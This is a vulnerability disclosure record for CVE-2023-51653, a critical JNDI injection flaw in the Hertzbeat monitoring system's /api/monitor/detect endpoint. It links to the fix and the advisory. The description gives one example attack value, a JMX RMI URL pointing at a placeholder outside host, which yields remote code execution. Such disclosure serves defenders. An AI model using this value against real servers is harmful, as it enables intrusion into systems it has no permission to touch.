{"id":"CVE-2023-51653","publishedDate":"2024-02-22T16:15:53.800","cvssV3":9.8,"description":"Hertzbeat is a real-time monitoring system. In the implementation of `JmxCollectImpl.java`, `JMXConnectorFactory.connect` is vulnerable to JNDI injection. The corresponding interface is `/api/monitor/detect`. If there is a URL field, the address will be used by default. When the URL is `service:jmx:rmi:///jndi/rmi://xxxxxxx:1099/localHikari`, it can be exploited to cause remote code execution. Version 1.4.1 contains a fix for this issue.","references":["https://github.com/dromara/hertzbeat/commit/f794b0d82be49c596c04a042976446559eb315ef","https://github.com/dromara/hertzbeat/security/advisories/GHSA-gcmp-vf6v-59gg","https://github.com/dromara/hertzbeat/commit/f794b0d82be49c596c04a042976446559eb315ef","https://github.com/dromara/hertzbeat/security/advisories/GHSA-gcmp-vf6v-59gg"]}
